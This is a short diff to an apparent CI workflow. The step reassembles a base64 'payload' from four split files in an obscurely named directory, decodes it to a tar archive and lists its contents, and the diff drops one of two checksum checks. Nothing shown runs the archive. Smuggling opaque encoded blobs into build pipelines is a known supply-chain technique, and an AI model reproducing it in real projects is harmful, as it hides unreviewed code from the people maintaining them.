@@ -24,8 +24,7 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          cat .z2f4/part00 .z2f4/part01 .z2f4/part02 .z2f4/part03 > /tmp/z2f4-payload.b64
-          echo '8bdd9b92524cb07c8367d687a282d0390e5de02463ecbd9f0945766aa6328994  /tmp/z2f4-payload.b64' | sha256sum -c -
+          cat .z2f4/part00 .z2f4/part01 .z2f4/part02 .z2f4/part03 | tr -d '\r\n' > /tmp/z2f4-payload.b64
           base64 -d /tmp/z2f4-payload.b64 > /tmp/z2f4-payload.tar.gz
           echo 'ed0c8b4f0c2e7c45d97d9c5a7bcdfb3ae3f22d6c612bb92e91f6a684ea5f6917  /tmp/z2f4-payload.tar.gz' | sha256sum -c -
           tar -tzf /tmp/z2f4-payload.tar.gz
